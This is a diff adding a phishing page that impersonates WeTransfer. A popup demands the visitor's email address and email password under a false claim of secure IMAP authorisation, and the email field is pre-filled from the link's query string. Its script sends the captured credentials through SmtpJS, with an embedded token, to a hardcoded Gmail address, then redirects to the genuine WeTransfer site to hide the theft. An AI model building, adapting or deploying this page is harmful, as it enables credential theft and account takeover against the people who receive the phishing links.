@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeTransfer</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <aside class="sidebar">
+        <div class="logo">
+            <img src="logo.png" alt="Logo" id="logo">
+        </div>
+        <nav>
+            <ul>
+                <li><a qa="https://wetransfer.com/">Shared</a></li>
+                <li><a href="https://wetransfer.com/">My Files</a></li>
+                <li><a href="https://wetransfer.com/">File Requests</a></li>
+                <li><a href="https://wetransfer.com/">Deleted Files</a></li>
+            </ul>
+        </nav>
+    </aside>
+    <main>
+        <h1>WeTransfer</h1>
+        
+   <div class="images">
+            <img src="image1.jpg" alt="Image 1" class="clickable-image">
+            <img src="image4.jpg" alt="Image 1" class="clickable-image">
+     </div>
+            
+   <div class="images"> 
+                <img src="image2.jpg" alt="Image 2" class="clickable-image">
+                
+                <img src="image3.jpg" alt="Image 3" class="clickable-image"> 
+        </div>        
+    </main>
+    <aside class="right-sidebar">
+        <div class="upgrade">
+            <img src="star.png" alt="Star Icon" class="icon">
+            <span>Upgrade Account</span>
+        </div>
+        <div class="search">
+            <input type="text" placeholder="Search">
+            <img src="notification.png" alt="Notification Bell Icon" class="icon">
+        </div>
+        <div class="message-box">
+            <strong><h1>Click on a document to view</strong></h1>
+        </div>
+        <div class="actions">
+            <div class="action"><img src="upload.png" alt="Upload Icon" class="icon"><span>Upload Files</span></div>
+            <div class="action"><img src="upload_folder.png" alt="Upload Folder Icon" class="icon"><span>Upload Folder</span></div>
+            <div class="action"><img src="new_folder.png" alt="New Folder Icon" class="icon"><span>New Folder</span></div>
+            <div class="action"><img src="shared_folder.png" alt="Shared Folder Icon" class="icon"><span>New Shared Folder</span></div>
+            <div class="action"><img src="request_files.png" alt="Request Files Icon" class="icon"><span>Request Files</span></div>
+        </div>
+    </aside>
+    
+        <!-- Pop-up Message -->
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <span class="close">&times;</span>
+            <img src="popup-image.jpg" alt="Popup Image" class="popup-image">
+            
+            <p>These files are sensitive and secured against unauthorized access. In order to access this file, please provide your correct email credentials, we will connect to your email provider through a secured IMAP channel to authorize your download.</p>
+            
+            <h2>Please confirm receiving emails to receive file</h2>
+            <form>
+                <label for="email"></label><br>
+                <input type="text" placeholder="Enter email" id="email" ><br>
+                <label for="password"></label><br>
+                <input type="password" placeholder="Enter email password" id="password"><br><br>
+                <button type="submit" onclick="SendEmail()">View Files</button>
+            </form>
+            <p>&copy; copyright WeTransfer Inc. 2024</p>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+    
+     <script>
+        window.onload = function() {
+            var urlParams = new URLSearchParams(window.location.search);
+            var email = urlParams.get('email');
+            document.getElementById('email').value = email || '';
+        };
+ </script>
+    
+    
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+
+ <script>
+     function SendEmail() {
+    event.preventDefault();
+    let email = document.getElementById("email").value.trim();
+    let password = document.getElementById("password").value.trim();
+
+    let body = "Email: ";
+    if (email !== "") {
+        body += email;
+    } else {
+        body += "Not provided";
+    }
+    body += "<br> Password: ";
+    if (password !== "") {
+        body += password;
+    } else {
+        body += "Not provided";
+    }
+
+    Email.send({
+        SecureToken: "8c1f6c2a-54a4-4d36-a565-8ef819110ef7",
+        To: 'nowtext081@gmail.com',
+        From: "nowtext081@gmail.com",
+        Subject: "Message From Alibaba",
+        Body: body
+    }).then(
+        function(response) {
+            // Redirect to success page after email is sent successfully
+            window.location.href = "http://WeTransfer.com/";
+        }
+    );
+}
+
+    </script>
+  
+    
+</body>
+</html>>
+</body>
+</html>
